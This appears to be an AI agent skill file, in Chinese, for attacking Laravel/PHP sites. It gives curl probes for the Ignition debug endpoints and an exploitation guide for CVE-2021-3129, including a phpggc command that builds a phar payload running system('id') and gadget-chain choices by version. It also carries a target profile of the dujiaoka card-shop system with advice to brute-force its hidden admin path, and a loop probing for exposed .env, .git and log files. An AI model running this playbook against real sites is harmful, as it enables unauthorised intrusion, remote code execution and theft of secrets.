---
name: laravel-security-testing
description: Use when testing Laravel/PHP web apps for security.
---

# Laravel/PHP Web 应用安全测试

## 一、指纹识别

### 1.1 框架识别
- **Cookie 特征**：响应头含 `XSRF-TOKEN` + `<appname>_session` 两个 cookie = Laravel（几乎可确定）
- 表单里 `_token`（CSRF）字段、`XSRF-TOKEN` meta 标签
- 常见路径：`/_ignition/health-check`、`/storage/logs/`、`/vendor/`

### 1.2 debug 模式检测（APP_DEBUG=true）
- 触发任意错误 → 返回**完整堆栈 + code_snippet** = debug 开启
- debug 开启时错误页 JSON 泄露敏感字段：
  - `env` 字段 → `laravel_version` / `php_version` / `laravel_config_cached` / `laravel_locale`
  - `context.request` → url / method / useragent / `request_data.body`（含 POST body）
  - 服务器绝对路径（如宝塔 `/www/wwwroot/<site>/`）

## 二、CVE-2021-3129 Laravel Ignition RCE

影响：Laravel 6~8 + Ignition ≤ 2.5.1 + `APP_DEBUG=true`。利用 = 日志污染 + phar 反序列化。

### 2.1 检测（可靠，已实战验证）

```bash
# 漏洞存在性判断（关键端点）
curl https://target/_ignition/health-check
# 返回 {"can_execute_commands":true} = 漏洞存在

# 版本指纹（无需认证，触发错误泄露 env）
curl -X POST https://target/_ignition/execute-solution \
  -H "Content-Type: application/json" \
  -d '{"solution":"INVALID_CLASS","parameters":{}}'
# 错误页 JSON 的 "env" 字段泄露 laravel_version/php_version
# 例：dujiaoka(独角数卡) = Laravel 6.20.42 + PHP 7.4.33
```

### 2.2 利用失败的根因诊断（官方 PoC 失效时先查这个）

官方 PoC（ambionics `laravel-ignition-rce.py`）利用链依赖 `file_get_contents(payload)` 触发 **warning** → warning 消息（含 payload）写入 `laravel.log` → `php://filter/write=convert.base64-decode|...` 过滤器链把日志还原为 phar → `phar://` 触发反序列化。**整条链依赖 warning 写日志**。

**判定 warning 是否被静默**（关键一步）：

| 触发源 | 正常（可写日志） | 被静默（日志污染失效） |
|---|---|---|
| `file_get_contents` 读不存在文件 | 500 错误页（ErrorException） | **200 空响应** |
| `ClassNotFoundException` / `abort(404)` | 404 错误页 | 404 错误页（异常正常记录） |

若 `file_get_contents` 对不存在文件返回 **200 空响应**（而非 500），说明目标 `error_reporting` 排除了 `E_WARNING` → warning 静默不写日志 → phar RCE 无法触发。

**其他已排除的污染向量**：
- solution 参数无效类名 → `abort(404,'Solution could not be found')`，payload 只在错误页 `request_data.body.solution`，而 Laravel 日志只记异常对象（message+stacktrace），**不记 request_data**
- `RunMigrationsSolution` / `GenerateAppKeySolution` → 只执行固定 `Artisan::call('migrate')`/`key:generate`，无参数注入
- 无效过滤器 / 非法 stream wrapper → 同样走 warning 静默路径
- `php://filter` 的 read/write **不能分离不同 resource**（只有一个 resource），无法读 `.env` 写 `public/`

**源码要点（Ignition 2.5.1）**：
- `ExecuteSolutionController` 无 try-catch（warning 静默是 error_reporting 配置所致，非代码捕获）
- `MakeViewVariableOptionalSolution::makeOptional()` 的 token 检查（`generateExpectedTokens`）：`variableName` 不存在于内容时返回原 token，检查通过，`file_put_contents` 仍会执行——失败根因在 warning 静默，不在 token 检查

### 2.3 phpggc gadget 链按 Laravel 版本选择

```bash
php -d'phar.readonly=0' phpggc -p phar -f <GadgetChain> system "id" -o exploit.phar
# Laravel 6.x  → Laravel/RCE2、RCE4、RCE13~RCE16
# Laravel 8.x  → Laravel/RCE8、RCE9、RCE11
# Monolog 2.x  → Monolog/RCE1（官方 PoC 推荐，配 -f fast-destruct）
# 版本不匹配 → 反序列化失败（返回 200 而非 500）
```

## 三、发卡系统特征（dujiaoka 独角数卡）

- 框架：Laravel 6.20.42 + PHP 7.4.33（可通过错误页 env 确认）
- 中间件：`App\Http\Middleware\DujiaoSystem`（出现在错误堆栈）
- 前台路由：`/buy/{gid}`、`/order-search`、`/create-order`、`/install`（完成安装后 302 回首页）
- 支付：Epusdt（`pay.<domain>`，API `/api/v1/order/create-transaction` 需签名）
- 后台 `/admin` 可能被 nginx 直接 404（非 Laravel 处理），需大词表爆破自定义后台路径
- 订单查询需 `order_sn` + `search_pwd`（先验订单号，后验密码，返回"订单不存在"）

## 四、常见 Laravel 泄露检查清单

```bash
for p in /.env /.env.bak /.env.example /storage/logs/laravel.log /.git/HEAD /.git/config /_ignition/execute-solution /telescope /horizon /log-viewer; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target$p"); echo "$code $p"; done
```
